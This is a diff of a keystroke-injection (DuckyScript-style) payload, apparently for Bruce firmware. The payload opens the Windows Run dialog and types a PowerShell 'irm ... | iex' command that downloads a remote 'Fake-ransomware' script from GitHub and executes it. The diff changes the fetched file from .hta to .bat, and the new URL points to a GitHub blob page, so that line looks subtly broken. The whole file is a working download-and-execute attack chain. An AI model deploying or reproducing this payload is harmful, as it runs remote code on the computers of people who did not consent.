@@ -1,6 +1,6 @@
 WINDOWS r 
 DELAY 500
-STRING powershell -Command "irm https://raw.githubusercontent.com/bilic8484-afk/Fake-ransomware-for-bruce-firmware/refs/heads/main/Fakeransomware.hta | iex"
+STRING powershell -Command "irm https://github.com/bilic8484-afk/Fake-ransomware-for-bruce-firmware/blob/main/Fakeransomware.bat| iex"
 ENTER
 DELAY 10000
 WINDOWS r
